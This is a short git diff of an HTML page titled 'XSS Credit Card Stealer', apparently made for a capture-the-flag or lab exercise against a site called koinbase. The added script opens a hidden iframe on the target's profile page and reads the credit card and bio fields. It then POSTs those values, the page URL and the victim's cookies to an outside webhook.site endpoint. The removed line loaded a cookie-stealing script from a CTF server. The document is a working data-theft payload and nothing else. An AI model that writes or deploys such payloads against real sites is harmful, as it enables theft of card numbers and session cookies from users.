@@ -1,6 +1,41 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>XSS Credit Card Stealer</title>
+  </head>
   <body>
-    <script src="https://alakinnn.github.io/ctf-server/cookie.js"></script>
+    <script>
+      (async () => {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = "https://koinbase.cyberjutsu-lab.tech/profile.php";
+        document.body.appendChild(iframe);
+
+        iframe.onload = () => {
+          try {
+            const doc = iframe.contentWindow.document;
+            const creditCard = doc.querySelector('#credit_card')?.value || 'not found';
+            const bio = doc.querySelector('#bio')?.value || 'not found';
+
+            fetch("https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                creditCard,
+                bio,
+                location: iframe.contentWindow.location.href,
+                cookies: document.cookie
+              })
+            });
+          } catch (e) {
+            fetch("https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ error: e.toString() })
+            });
+          }
+        };
+      })();
+    </script>
   </body>
 </html>
